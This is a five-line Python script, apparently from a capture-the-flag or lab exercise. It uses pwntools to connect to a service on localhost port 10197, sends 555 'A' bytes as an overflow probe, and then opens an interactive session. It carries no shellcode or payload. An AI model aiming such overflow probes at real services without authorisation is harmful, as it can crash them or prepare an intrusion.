from pwn import *

p = remote('localhost',10197)

p.sendline(b'A' * 555)

p.interactive()
